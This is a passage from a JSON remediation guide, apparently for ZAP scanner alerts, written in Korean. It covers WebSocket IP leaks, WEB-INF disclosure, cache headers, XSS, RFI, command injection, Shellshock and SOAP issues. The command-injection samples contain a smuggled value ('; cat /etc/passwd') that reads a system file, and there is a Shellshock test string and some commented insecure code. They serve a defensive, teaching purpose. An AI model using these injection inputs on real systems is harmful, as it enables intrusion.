    "description": "WebSocket 통신을 통해 서버 또는 내부 네트워크의 사설 IP 주소가 클라이언트에 노출되는 취약점입니다.",
    "solution_guidelines": [
      "**WebSocket Secure (WSS) 사용:** 모든 WebSocket 통신은 `wss://`를 통해 암호화되어야 합니다.",
      "**WebSocket 메시지에 내부 IP 포함 금지:** WebSocket 서버가 클라이언트에게 보내는 메시지, 에러 응답, 상태 정보 등에 내부 IP 주소가 직접적으로 포함되지 않도록 합니다.",
      "**로그 및 디버깅 정보:** 개발/디버깅 목적으로 WebSocket 메시지에 내부 IP 주소를 포함시켰다면, 프로덕션 배포 전에 반드시 제거합니다.",
      "**프록시/로드 밸런서 설정 확인:** WebSocket 트래픽을 처리하는 프록시나 로드 밸런서가 내부 IP 주소를 노출하지 않도록 설정되었는지 확인합니다."
    ],
    "example_websocket_ip_fix": "# Node.js WebSocket 서버 예시 (ws 라이브러리)\nconst WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\n\nwss.on('connection', ws => {\n    ws.on('message', message => {\n        // 클라이언트로부터 메시지를 수신 (예시)\n        console.log(`Received message: ${message}`);\n        // 서버에서 클라이언트로 응답을 보낼 때 내부 IP 주소를 포함하지 않도록 주의\n        // ws.send(`Your IP is: ${ws._socket.remoteAddress}`); // 절대 이렇게 하지 마세요!\n        ws.send('Message processed successfully.');\n    });\n});\n\n# Spring WebSocket (Java) 예시:\n// @MessageMapping 또는 @SendTo 등의 어노테이션을 사용하는 컨트롤러에서\n// 반환되는 메시지나, 메시지 전송 로직에서 내부 IP 주소가 포함되지 않도록 합니다.\n// 예를 들어, 메시지에 서버의 IP 주소를 담아 보내는 코드를 피합니다.\n    "
  },
  "Properties File Disclosure - /WEB-INF folder": {
    "translated": "Properties 파일 노출 - /WEB-INF 폴더 – Java 웹 애플리케이션의 /WEB-INF 폴더에 설정 파일(.properties)이 노출됨",
    "description": "Java 웹 애플리케이션의 `/WEB-INF` 디렉토리에 위치한 `.properties` 파일(예: `database.properties`, `config.properties`)이 웹 서버를 통해 직접 접근 가능하여 민감한 정보(데이터베이스 자격 증명, API 키 등)가 유출될 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**`/WEB-INF` 디렉토리 웹 접근 차단:** `/WEB-INF`는 웹 서버가 직접 서비스하지 않는 보호된 디렉토리로, 웹 서버 설정에서 이 디렉토리 및 그 하위 파일에 대한 직접적인 접근을 명시적으로 차단합니다.",
      "**`.properties` 파일에 민감 정보 포함 최소화:** 꼭 필요한 경우에만 `.properties` 파일에 민감 정보를 저장하고, 가능한 한 환경 변수나 보안 볼트(Vault) 서비스(예: HashiCorp Vault)를 통해 관리합니다.",
      "**.gitignore에 추가:** `.properties` 파일(특히 개발 환경에서 민감 정보를 포함하는)이 Git 저장소에 포함되지 않도록 `.gitignore`에 추가합니다.",
      "**배포 전 검토:** 배포 전에 애플리케이션 WAR/EAR 파일 내에 민감한 `.properties` 파일이 부적절하게 포함되어 있지 않은지 확인합니다."
    ],
    "example_web_xml_security": "<security-constraint>\n    <web-resource-collection>\n        <web-resource-name>WEB-INF</web-resource-name>\n        <url-pattern>/WEB-INF/*</url-pattern>\n    </web-resource-collection>\n    <auth-constraint /> </security-constraint>\n\n# 웹 서버 설정 (Nginx 예시) - 추가적인 방어\nlocation ~ ^/WEB-INF/ {\n    deny all;\n}\n    "
  },
  "Proxy Disclosure": {
    "translated": "프록시 정보 노출 – 웹 서버가 프록시 서버를 통해 서비스될 때 프록시 서버의 정보가 노출됨",
    "description": "웹 서버나 애플리케이션이 프록시 서버의 존재를 나타내는 정보(예: `Via` 헤더)나 프록시 관련 헤더에 내부 네트워크 정보(예: 내부 IP 주소)를 노출하는 취약점입니다.",
    "solution_guidelines": [
      "**프록시 관련 헤더 제거/수정:** 웹 서버 또는 프록시/로드 밸런서 설정에서 `Via`, `X-Forwarded-For`, `X-Proxy-ID` 등 프록시 관련 헤더에 내부 네트워크 정보가 노출되지 않도록 제거하거나, 외부 IP 주소만 포함하도록 수정합니다.",
      "**`Via` 헤더 비활성화:** Apache의 `mod_headers`나 Nginx의 `proxy_hide_header` 설정을 통해 `Via` 헤더의 전송을 비활성화합니다.",
      "**자세한 서버 정보 노출 금지:** 웹 서버, 애플리케이션 서버의 버전 정보 등 불필요한 정보가 HTTP 응답 헤더나 오류 페이지에 노출되지 않도록 합니다."
    ],
    "example_nginx_proxy_headers_fix": "# Nginx 설정 예시: 프록시 관련 헤더 숨기기\nserver {\n    listen 80;\n    server_name example.com;\n\n    location / {\n        proxy_pass http://backend_server;\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n\n        # 다음 헤더들을 숨기거나 제거하여 내부 정보 노출 방지\n        proxy_hide_header X-Powered-By;\n        proxy_hide_header Server;\n        proxy_hide_header Via; # Via 헤더 숨기기\n    }\n}\n    ",
    "example_apache_proxy_headers_fix": "# Apache httpd.conf 또는 가상 호스트 설정 예시\n<VirtualHost *:80>\n    ServerName example.com\n    ProxyRequests Off\n    ProxyPreserveHost On\n\n    ProxyPass / http://backend_server/\n    ProxyPassReverse / http://backend_server/\n\n    # Via 헤더 제거\n    Header unset Via\n\n    # 다른 불필요한 헤더 제거\n    Header unset X-Powered-By\n    Header unset Server\n</VirtualHost>\n    "
  },
  "Re-examine Cache-control Directives": {
    "translated": "Cache-control 지시자 재검토 – 캐싱 설정이 보안적으로 적절한지 다시 확인이 필요함",
    "description": "HTTP `Cache-Control` 헤더의 지시어(directives)가 올바르게 설정되지 않아 민감한 정보가 캐시되거나, 웹 애플리케이션의 성능에 부정적인 영향을 미칠 수 있음을 나타냅니다.",
    "solution_guidelines": [
      "**`Cache-Control: no-store`:** 로그인 페이지, 개인 정보 페이지 등 민감한 정보가 포함된 페이지는 절대로 캐시되지 않도록 `no-store` 지시어를 사용합니다.",
      "**`Cache-Control: no-cache`:** 캐시를 사용하되, 캐시된 사본을 사용하기 전에 서버에 재검증을 요청하도록 `no-cache`를 사용합니다. `max-age=0, must-revalidate`와 함께 사용될 수 있습니다.",
      "**`private` vs `public`:** 사용자별로 다른 콘텐츠는 `private`으로 설정하여 공유 캐시에 저장되지 않도록 하고, 모든 사용자에게 동일한 콘텐츠는 `public`으로 설정하여 캐싱을 허용합니다.",
      "**`max-age` 및 `s-maxage`:** 캐시 유효 기간을 적절히 설정합니다. `max-age`는 클라이언트 및 프록시 캐시, `s-maxage`는 공유 캐시에 적용됩니다.",
      "**`Vary` 헤더:** `Accept-Encoding`, `User-Agent` 등 요청 헤더에 따라 응답이 달라지는 경우 `Vary` 헤더를 사용하여 프록시 캐시가 올바른 응답을 제공하도록 합니다.",
      "**`Expires` 및 `Pragma` (하위 호환성):** HTTP 1.0 호환성을 위해 필요할 수 있지만, `Cache-Control`이 더 강력합니다."
    ],
    "example_cache_control_headers": "# 웹 서버 설정 (Nginx 예시)\n# 정적 파일에 대한 캐시 설정 (장기 캐시)\nlocation ~* \\.(jpg|jpeg|gif|png|css|js|ico|woff|woff2|ttf|eot)$ {\n    expires 30d;\n    add_header Cache-Control \"public, max-age=2592000\"; # 30일\n}\n\n# 민감한 페이지에 대한 캐시 방지\nlocation /secure/profile {\n    add_header Cache-Control \"no-store, no-cache, must-revalidate, proxy-revalidate\";\n    add_header Pragma \"no-cache\";\n    add_header Expires \"0\";\n}\n\n# Apache httpd.conf 또는 .htaccess 예시\n# <FilesMatch \"\\.(jpg|jpeg|gif|png|css|js|ico|woff|woff2|ttf|eot)$\">\n# \t Header set Cache-Control \"public, max-age=2592000\"\n# </FilesMatch>\n\n# <Location /secure/profile>\n# \t Header set Cache-Control \"no-store, no-cache, must-revalidate, proxy-revalidate\"\n# \t Header set Pragma \"no-cache\"\n# \t Header set Expires \"0\"\n# </Location>\n\n# Node.js Express 예시\napp.get('/public-asset.js', (req, res) => {\n    res.set('Cache-Control', 'public, max-age=31536000'); // 1년 캐시\n    res.sendFile(__dirname + '/public/public-asset.js');\n});\n\napp.get('/private-data', (req, res) => {\n    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0');\n    res.set('Pragma', 'no-cache');\n    res.set('Expires', '0');\n    res.send('This is private data.');\n});\n    "
  },
  "Referer Exposes Session ID": {
    "translated": "Referer를 통한 세션 ID 노출 – HTTP Referer 헤더에 세션 ID가 포함되어 노출될 수 있음",
    "description": "HTTP `Referer` (또는 `Referrer`) 헤더를 통해 세션 ID나 기타 민감한 정보가 외부 사이트로 노출되는 취약점입니다. 이는 주로 URL에 세션 ID가 포함될 때 발생합니다.",
    "solution_guidelines": [
      "**URL에 세션 ID 포함 금지:** 세션 ID는 URL 쿼리 파라미터나 경로에 포함하지 않고, 반드시 HttpOnly 및 Secure 속성이 설정된 쿠키를 통해서만 전송합니다.",
      "**`Referrer-Policy` 헤더 사용:** `Referrer-Policy` 헤더를 사용하여 `Referer` 정보의 전송 범위를 제어합니다. `no-referrer`, `same-origin`, `strict-origin-when-cross-origin` 등이 권장됩니다.",
      "**HTTPS 사용 강제:** 모든 통신에 HTTPS를 사용합니다. HTTP에서 HTTPS로 리다이렉션될 때 `Referer` 정보가 노출될 수 있으므로, HTTPS를 처음부터 강제합니다.",
      "**민감 정보는 POST 요청 본문에:** URL에 민감한 정보가 포함되는 것을 피하기 위해 POST 요청의 본문을 사용합니다."
    ],
    "example_referrer_policy_header": "# 웹 서버 설정 (Nginx 예시)\nadd_header Referrer-Policy \"no-referrer-when-downgrade\"; # HTTPS에서 HTTP로 이동 시 Referer 전송 안함\n# add_header Referrer-Policy \"no-referrer\"; # 모든 Referer 전송 안함 (가장 엄격)\n# add_header Referrer-Policy \"same-origin\"; # 동일 출처 요청에만 Referer 전송\n\n# Apache httpd.conf 또는 .htaccess 예시\n# Header always set Referrer-Policy \"no-referrer-when-downgrade\"\n\n# HTML <meta> 태그 사용 (HTML 문서 자체에 적용)\n<meta name=\"referrer\" content=\"no-referrer-when-downgrade\">\n    "
  },
  "Reflected HTTP GET Parameter(s)": {
    "translated": "반사된 HTTP GET 매개변수 – HTTP GET 요청 파라미터가 웹 페이지에 그대로 반영되어 XSS 등에 취약할 수 있음",
    "description": "HTTP GET 요청의 URL 파라미터에 포함된 사용자 입력값이 웹 페이지의 응답에 검증 및 인코딩 없이 그대로 반영되어 XSS(Cross-Site Scripting) 공격으로 이어질 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**출력 인코딩:** 사용자 입력값이 HTML, JavaScript, URL 등 어떤 컨텍스트에 삽입되더라도 해당 컨텍스트에 맞는 적절한 출력 인코딩을 적용합니다. (예: HTML 엔티티 인코딩, JavaScript 이스케이프)",
      "**입력값 유효성 검사:** 사용자 입력값을 서버 측에서 철저히 검증하여 예상되는 형식과 범위 내에 있는지 확인하고, 악의적인 문자를 필터링합니다.",
      "**Content-Security-Policy (CSP) 사용:** XSS 공격을 완화하기 위해 스크립트 실행을 제한하는 강력한 CSP를 설정합니다.",
      "**HTTP Only 쿠키 사용:** 세션 쿠키에 `HttpOnly` 속성을 설정하여 클라이언트 측 스크립트가 세션 쿠키에 접근하는 것을 방지합니다 (XSS로 인한 세션 하이재킹 완화)."
    ],
    "example_java_jsp_xss_fix": "<p>Hello, <c:out value=\"${param.name}\" />!</p>\n<%-- 또는 JSTL이 없는 경우: --%>\n<%-- String name = request.getParameter(\"name\"); --%>\n<%-- if (name != null) { --%>\n<%-- \t out.print(org.owasp.esapi.ESAPI.encoder().encodeForHTML(name)); --%>\n<%-- } --%>\n\n// Controller\n@GetMapping(\"/welcome\")\npublic String welcome(@RequestParam String name, Model model) {\n    model.addAttribute(\"username\", name);\n    return \"welcome_page\";\n}\n\n// welcome_page.html (Thymeleaf 예시)\n<p th:text=\"${username}\"></p>\n    ",
    "example_php_xss_fix": "<?php\n// Insecure: 출력 인코딩 없음\n// echo \"<p>Hello, \" . $_GET['name'] . \"!</p>\";\n\n// Secure: HTML 엔티티 인코딩\necho \"<p>Hello, \" . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . \"!</p>\n?>\n    "
  },
  "Relative Path Confusion": {
    "translated": "상대 경로 혼동 – 상대 경로 처리 오류로 인해 의도치 않은 파일에 접근하거나 예상치 못한 동작을 유발함",
    "description": "상대 경로를 해석하는 방식의 혼동으로 인해, 공격자가 웹 애플리케이션의 특정 경로에 대한 접근 제어를 우회하거나, 의도치 않은 파일을 로드하게 만들 수 있는 취약점입니다. 이는 주로 웹 서버나 애플리케이션이 URL을 해석하는 방식과 브라우저가 상대 경로를 해석하는 방식의 차이에서 발생합니다.",
    "solution_guidelines": [
      "**모든 경로를 절대 경로로 처리:** 가능한 모든 내부 링크, 스크립트, 스타일시트 등 리소스 로드 시 상대 경로 대신 절대 경로를 사용합니다.",
      "**`base` 태그 사용 주의:** `<base>` 태그를 사용할 경우, 의도치 않은 기준 URL로 인해 모든 상대 경로가 잘못 해석될 수 있으므로 사용에 신중하고, 동적으로 생성되는 `base` 태그에 사용자 입력이 반영되지 않도록 합니다.",
      "**URL 재작성 규칙 검토:** 웹 서버(Apache `mod_rewrite`, Nginx `rewrite`)의 URL 재작성(URL Rewriting) 규칙을 검토하여, `.` 또는 `..`와 같은 상대 경로 요소가 예상치 못한 방식으로 해석되지 않도록 합니다.",
      "**입력값 경로 검증:** 파일 시스템 경로 또는 URL 경로에 사용자 입력이 사용되는 경우, `Path Traversal` 방어와 유사하게 강력한 유효성 검사 및 정규화를 수행합니다."
    ],
    "example_base_tag_security": "<base href=\"https://www.example.com/app/\">\n\n// Insecure:\n// var path = userInput + \"/image.png\";\n// var imageUrl = new URL(path, window.location.origin).href;\n\n// Secure: 항상 절대 경로를 명시적으로 사용하거나, 경로 조합 시 안전한 API 사용\nvar imageUrl = new URL(\"/static/images/image.png\", window.location.origin).href;\n    "
  },
  "Relative Path Overwrite": {
    "translated": "상대 경로 덮어쓰기 – 상대 경로를 사용하여 URL이나 파일 경로를 조작하여 악의적인 파일을 덮어쓰거나 접근을 우회하는 공격",
    "description": "웹 서버나 애플리케이션이 URL을 처리하는 방식의 결함으로 인해, 공격자가 상대 경로를 조작하여 웹 페이지의 일부 콘텐츠를 덮어쓰거나, 웹 페이지가 공격자가 제어하는 외부 스크립트나 스타일시트를 로드하도록 만들 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**`X-Content-Type-Options: nosniff` 헤더 사용:** 브라우저의 MIME 타입 스니핑을 방지하여 공격자가 잘못된 MIME 타입으로 콘텐츠를 로드하여 스크립트 등으로 해석되는 것을 막습니다.",
      "**Content-Security-Policy (CSP) 강화:** `script-src`, `style-src` 등 지시어를 엄격하게 설정하여 외부 또는 의도치 않은 출처에서 스크립트나 스타일시트가 로드되지 않도록 합니다.",
      "**URL 정규화 및 유효성 검사:** 서버 측에서 수신된 URL을 정규화하고, 예상되는 형식과 패턴에 맞는지 엄격하게 유효성 검사를 수행합니다.",
      "**상대 URL 사용 지양:** 가능한 모든 리소스 로드 시 절대 URL을 사용합니다.",
      "**오류 메시지 일반화:** 상세한 파일 경로, 서버 정보 등을 포함하는 오류 메시지가 노출되지 않도록 합니다."
    ],
    "example_headers_and_csp": "# 웹 서버 설정 (Nginx 예시)\nadd_header X-Content-Type-Options \"nosniff\";\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self'; style-src 'self'; object-src 'none';\";\n\n# Apache httpd.conf 또는 .htaccess 예시\n# Header always set X-Content-Type-Options \"nosniff\"\n# Header always set Content-Security-Policy \"default-src 'self'; script-src 'self'; style-src 'self'; object-src 'none';\"\n    "
  },
  "Remote Code Execution - CVE-2012-1823": {
    "translated": "원격 코드 실행 - CVE-2012-1823 – PHP CGI 취약점(CVE-2012-1823)을 이용한 원격 코드 실행",
    "description": "PHP CGI의 취약점으로, 웹 서버의 특정 설정에서 요청 파라미터를 통해 임의의 PHP 코드를 실행할 수 있게 하는 원격 코드 실행(RCE) 취약점입니다.",
    "solution_guidelines": [
      "**PHP 및 웹 서버 최신 버전으로 업데이트:** 영향을 받는 PHP 버전(5.3.12, 5.4.2 이하) 및 웹 서버를 최신 보안 패치가 적용된 버전으로 업데이트합니다.",
      "**안전한 PHP-FPM 또는 FastCGI 설정:** PHP-FPM이나 FastCGI를 사용할 때, `cgi.fix_pathinfo=0`으로 설정하여 경로 정보가 잘못 해석되는 것을 방지합니다.",
      "**웹 서버 설정 강화:** 웹 서버 설정에서 PHP 파일에 대한 접근 권한을 제한하고, 불필요한 CGI 실행을 비활성화합니다."
    ],
    "example_php_cgi_fix": "# php.ini 설정\ncgi.fix_pathinfo=0\n\n# Nginx 설정 예시 (PHP-FPM)\nlocation ~ \\.php$ {\n    # ...\n    include fastcgi_params;\n    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n    fastcgi_pass unix:/var/run/php/php7.4-fpm.sock; # 또는 TCP 소켓 주소\n    # fastcgi_param PATH_INFO $fastcgi_path_info; # 이 줄은 문제가 될 수 있으므로 제거하거나 신중하게 사용\n}\n    "
  },
  "Remote Code Execution - Shell Shock": {
    "translated": "원격 코드 실행 - Shell Shock – Bash 셸 취약점(Shell Shock)을 이용한 원격 코드 실행",
    "description": "Bash 셸의 취약점(CVE-2014-6271, CVE-2014-6278 등)으로, 환경 변수를 통해 전달되는 악성 코드가 Bash 스크립트를 실행하는 애플리케이션에서 원격 코드 실행(RCE)을 가능하게 합니다.",
    "solution_guidelines": [
      "**Bash 셸 최신 버전으로 업데이트:** 시스템의 Bash 셸을 보안 패치가 적용된 최신 버전으로 즉시 업데이트합니다.",
      "**CGI 스크립트 사용 최소화:** CGI(Common Gateway Interface)를 사용하는 웹 애플리케이션의 경우, 가능한 한 CGI 스크립트의 사용을 최소화하거나 안전한 대안(예: PHP-FPM, uWSGI, Gunicorn)을 사용합니다.",
      "**외부 입력 필터링:** 웹 애플리케이션에서 시스템 명령을 실행하는 경우, 모든 외부 입력(HTTP 헤더, 사용자 입력 등)을 엄격하게 필터링하고 이스케이프 처리합니다."
    ],
    "example_bash_update": "# CentOS/RHEL 에서 Bash 업데이트\nsudo yum update bash\n\n# Ubuntu/Debian 에서 Bash 업데이트\nsudo apt-get update\nsudo apt-get install --only-upgrade bash\n\n# Shell Shock 테스트 (안전한 환경에서만 실행)\n# env x='() { :;}; echo vulnerable' bash -c \"echo this is a test\"\n# If 'vulnerable' is printed, the system is vulnerable.\n    "
  },
  "Remote File Inclusion": {
    "translated": "원격 파일 포함 – 외부 서버의 악성 파일을 웹에 포함시켜 실행하는 취약점",
    "description": "웹 애플리케이션이 사용자 입력값을 통해 원격 서버에 있는 파일을 포함(include)할 수 있게 하여, 공격자가 악성 코드를 실행하거나 서버 파일을 읽을 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**`allow_url_include` 비활성화 (PHP):** PHP의 `php.ini` 설정에서 `allow_url_include`를 `Off`로 설정하여 원격 파일 포함을 명시적으로 금지합니다.",
      "**화이트리스트 기반 유효성 검사:** 파일 포함에 사용되는 모든 사용자 입력에 대해, 허용된 파일 목록(화이트리스트)에 있는지 엄격하게 검증합니다.",
      "**절대 경로 사용:** 사용자 입력 대신 내부적으로 정의된 절대 경로를 사용하여 파일을 포함하도록 합니다.",
      "**입력값 필터링 및 정규화:** `../`, `http://`, `https://` 등 경로 탐색 또는 원격 프로토콜을 나타내는 문자를 필터링하거나 제거합니다."
    ],
    "example_php_rfi_fix": "# php.ini 설정\nallow_url_fopen = Off  # 안전을 위해 이것도 Off로 설정\nallow_url_include = Off\n\n<?php\n// Insecure: vulnerable to RFI\n// $page = $_GET['page'];\n// include($page . \".php\");\n\n// Secure: 화이트리스트 기반 유효성 검사\n$allowed_pages = array(\"home\", \"about\", \"contact\");\n$page = $_GET['page'];\n\nif (in_array($page, $allowed_pages)) {\n    include($page . \".php\");\n} else {\n    // 오류 처리 또는 기본 페이지 로드\n    include(\"error.php\");\n}\n?>\n    "
  },
  "Remote OS Command Injection": {
    "translated": "원격 OS 명령어 주입 – 사용자 입력이 OS 명령어로 처리되어 공격자가 시스템 명령어를 실행할 수 있음",
    "description": "사용자 입력값이 웹 애플리케이션에서 OS 명령을 실행하는 함수(예: `exec`, `system`, `Runtime.exec`)에 적절히 검증되지 않고 삽입되어, 공격자가 서버에서 임의의 운영체제 명령을 실행할 수 있는 심각한 취약점입니다.",
    "solution_guidelines": [
      "**OS 명령 실행 최소화/금지:** 사용자 입력값을 기반으로 OS 명령을 실행하는 것을 가능한 한 피합니다. 필요한 경우에만 최소한의 권한으로 실행합니다.",
      "**매개변수화된 명령 실행 API 사용:** 언어/프레임워크가 제공하는 안전한 API를 사용하여 명령을 매개변수화하고, 사용자 입력을 명령의 인자로 전달합니다. 직접 문자열 연결을 피합니다.",
      "**입력값 유효성 검사 및 살균:** 모든 사용자 입력에 대해 강력한 화이트리스트 기반 유효성 검사를 수행하고, 명령 실행에 위험한 특수 문자(예: `&`, `|`, `;`, `$`, `(`, `)`, `` ` ``)를 제거하거나 이스케이프 처리합니다.",
      "**최소 권한 원칙:** 웹 애플리케이션이 실행되는 프로세스에 필요한 최소한의 시스템 권한만 부여합니다."
    ],
    "example_java_command_injection": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class CommandInjectionExample {\n\n    // Insecure: vulnerable to command injection\n    // public void executeCommandInsecure(String userCommand) throws IOException, InterruptedException {\n    // \t Process process = Runtime.getRuntime().exec(\"ls \" + userCommand);\n    // \t // ... read output ...\n    // }\n\n    // Secure: using ProcessBuilder with command and arguments separated\n    public void executeCommandSecure(String filename) throws IOException, InterruptedException {\n        // Assume 'filename' is validated against a whitelist or strict regex\n        if (filename == null || filename.contains(\";\") || filename.contains(\"&\") || filename.contains(\"|\")) {\n            throw new IllegalArgumentException(\"Invalid filename characters.\");\n        }\n\n        List<String> command = new ArrayList<>();\n        command.add(\"ls\");\n        command.add(filename); // filename is passed as an argument, not part of the command string\n\n        ProcessBuilder pb = new ProcessBuilder(command);\n        Process process = pb.start();\n\n        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            System.out.println(line);\n        }\n\n        int exitCode = process.waitFor();\n        System.out.println(\"Command exited with code: \" + exitCode);\n    }\n\n    public static void main(String[] args) throws IOException, InterruptedException {\n        CommandInjectionExample app = new CommandInjectionExample();\n        app.executeCommandSecure(\"-l\"); // Safe\n        app.executeCommandSecure(\"my_document.txt\"); // Safe\n        // app.executeCommandSecure(\"; cat /etc/passwd\"); // Throws IllegalArgumentException or would be handled safely\n    }\n}",
    "example_python_command_injection": "import subprocess\n\n# Insecure: vulnerable to command injection\n# def execute_command_insecure(user_input):\n# \t subprocess.call(\"ls \" + user_input, shell=True) # shell=True is dangerous\n\n# Secure: use subprocess.run with list of arguments, avoid shell=True\ndef execute_command_secure(filename):\n    if not filename or \";\" in filename or \"&\" in filename or \"|\" in filename:\n        raise ValueError(\"Invalid filename characters.\")\n    \n    try:\n        # Pass arguments as a list to prevent shell interpretation\n        result = subprocess.run([\"ls\", filename], capture_output=True, text=True, check=True)\n        print(result.stdout)\n    except subprocess.CalledProcessError as e:\n        print(f\"Error executing command: {e}\")\n    except ValueError as e:\n        print(f\"Input validation error: {e}\")\n\n# Example usage:\nexecute_command_secure(\"-l\")\nexecute_command_secure(\"my_script.sh\")\n# execute_command_secure(\"; cat /etc/passwd\") # Will raise ValueError\n    "
  },
  "Retrieved from Cache": {
    "translated": "캐시에서 검색됨 – 이전에 캐시되었던 콘텐츠가 다시 사용됨",
    "description": "이것은 취약점 자체가 아니라, ZAP이 요청에 대한 응답이 웹 캐시(예: 프록시 서버, CDN, 브라우저 캐시)에서 제공되었음을 나타내는 정보성 알림입니다. 이는 때때로 캐싱 관련 취약점(예: 민감 정보 캐싱, 캐시 중독)의 가능성을 시사할 수 있습니다.",
    "solution_guidelines": [
      "**`Cache-Control` 헤더 재검토:** 민감한 정보가 포함된 페이지나 사용자별로 달라지는 페이지는 `Cache-Control: no-store` 또는 `no-cache`를 사용하여 캐싱을 방지하고 있는지 확인합니다.",
      "**인증 및 인가된 콘텐츠 캐싱 금지:** 로그인된 사용자에게만 표시되는 콘텐츠는 공유 캐시에 저장되지 않도록 `private` 지시어를 사용하거나 아예 캐시를 비활성화합니다.",
      "**캐시 중독 방지:** `Host`, `X-Forwarded-Host` 등 캐싱 키에 사용될 수 있는 헤더에 대한 유효성 검사를 수행하여 공격자가 캐시를 조작하는 것을 방지합니다.",
      "**`Vary` 헤더 사용:** 사용자 에이전트, `Accept-Encoding` 등 요청 헤더에 따라 응답이 달라지는 경우 `Vary` 헤더를 사용하여 캐시가 올바른 버전을 제공하도록 합니다.",
      "**HTTPS 강제:** 모든 민감한 트래픽에 HTTPS를 사용하여 캐시 스푸핑 및 중간자 공격을 방지합니다."
    ],
    "example_general": "# 'Retrieved from Cache'에 대한 보안 가이드라인:\n# 1. 캐싱이 의도된 동작인지 확인합니다.\n# 2. 민감한 정보가 캐시되지 않도록 Cache-Control 헤더를 정확하게 설정합니다.\n# 3. HTTP 응답 헤더에 민감 정보가 포함되지 않도록 주의합니다.\n# 4. CDN 또는 프록시 서버를 사용하는 경우, 해당 서비스의 캐싱 설정이 보안 요구사항을 충족하는지 검토합니다.\n# 5. 캐시된 콘텐츠가 사용자 세션에 따라 달라져야 하는 경우, 사용자 인증 정보를 캐시 키로 사용하거나, 캐시를 완전히 비활성화합니다.\n    "
  },
  "Reverse Tabnabbing": {
    "translated": "리버스 탭내빙 – 새 탭 열기 시 원래 탭의 URL을 악의적인 사이트로 변경하여 피싱 공격을 시도할 수 있음",
    "description": "클릭재킹 공격의 일종으로, 대상 링크(`target=\"_blank\"` 속성을 가진)를 통해 새 탭이나 창이 열릴 때, 원본 페이지(이전 탭)를 악성 웹사이트로 변경하여 피싱 공격을 수행할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**`rel=\"noopener noreferrer\"` 속성 추가:** `target=\"_blank\"`를 사용하는 모든 `<a href=\"...\" target=\"_blank\">` 태그에 `rel=\"noopener noreferrer\"` 속성을 추가하여 새 창에서 `window.opener` 객체에 접근하는 것을 방지합니다.",
      "**`window.opener`를 `null`로 설정 (레거시 브라우저 지원 시):** JavaScript를 통해 새 창을 열 때 `window.opener = null;`을 설정하여 연결을 끊습니다. 이는 `rel=\"noopener\"`가 지원되지 않는 구형 브라우저를 위한 백업 조치입니다.",
      "**사용자에게 경고 메시지 제공:** 외부 링크로 이동할 때 사용자에게 알림을 제공하여 의심스러운 행동을 인지하도록 돕습니다."
    ],
    "example_code_html": "<a href=\"https://external-site.com\" target=\"_blank\" rel=\"noopener noreferrer\">안전한 외부 링크</a>\n\n<script>\nfunction openSecureWindow(url) {\n  const newWindow = window.open(url, '_blank');\n  if (newWindow) {\n    newWindow.opener = null; // Reverse Tabnabbing 방지\n  }\n}\n</script>\n<button onclick=\"openSecureWindow('https://external-site.com')\">안전하게 새 창 열기</button>\n    "
  },
  "SOAP Action Spoofing": {
    "translated": "SOAP 액션 스푸핑 – SOAP 요청의 'SOAPAction' 헤더를 조작하여 의도치 않은 웹 서비스 작업을 실행하는 공격",
    "description": "SOAP 기반 웹 서비스에서 SOAP Action 헤더의 위변조를 통해 특정 서비스 메서드를 호출하거나 예상치 못한 동작을 유도할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**SOAP Action 헤더 신뢰 금지:** SOAP Action 헤더에 포함된 값을 신뢰하여 중요한 비즈니스 로직이나 보안 결정을 내리지 않도록 합니다.",
      "**메서드 호출은 요청 본문(Body) 기반으로:** 실제 호출할 서비스 메서드는 SOAP 메시지 본문(Body)에 있는 XML 네임스페이스와 엘리먼트 이름을 기반으로 결정합니다.",
      "**입력값 유효성 검증:** SOAP 메시지 본문에 포함된 모든 입력값에 대해 엄격한 유효성 검사를 수행하여 악의적인 데이터 주입을 방지합니다.",
      "**접근 제어 강화:** 각 SOAP 서비스 메서드에 대한 인증 및 권한 부여를 철저히 적용하여 인가되지 않은 호출을 차단합니다."
    ],
    "example_code_java_jaxws": "// JAX-WS (Java) 예시: SOAP Action 헤더가 아닌 본문 기반으로 서비스 호출\n// (SOAP Action 헤더는 라우팅에 사용될 뿐, 실제 보안 로직이나 메서드 호출 결정에 사용되지 않음)\n\n@WebService\npublic class MyService {\n    public String processOrder(String orderId) {\n        // 실제 로직은 orderId 파라미터를 기반으로 수행\n        // SOAP Action 헤더의 값은 이 메서드 호출에 직접적인 영향을 주지 않음\n        System.out.println(\"Processing order: \" + orderId);\n        return \"Order \" + orderId + \" processed.\";\n    }\n\n    // 서비스 인터페이스 정의 예시 (SEI)\n    // @WebMethod(action = \"http://example.com/processOrder\")\n    // String processOrder(String orderId);\n}\n    "
  },
  "SOAP XML Injection": {
    "translated": "SOAP XML 인젝션 – SOAP(Simple Object Access Protocol) 통신에서 XML 데이터에 악의적인 페이로드를 주입하여 데이터 조작이나 서비스 거부를 유발함",
    "description": "SOAP 요청의 XML 페이로드에 악의적인 XML 코드를 삽입하여, XML 파서나 백엔드 시스템에서 예상치 못한 동작을 유발하거나 정보 유출, 서비스 거부 등을 초래할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**XML 파싱 시 외부 엔티티(XXE) 비활성화:** DTD(Document Type Definition) 및 외부 엔티티(External Entities) 처리를 비활성화하여 XXE 공격을 방지합니다.",
      "**입력값 유효성 검증:** SOAP 메시지의 XML 구조 및 데이터에 대해 엄격한 스키마 유효성 검사(XSD)를 수행합니다.",
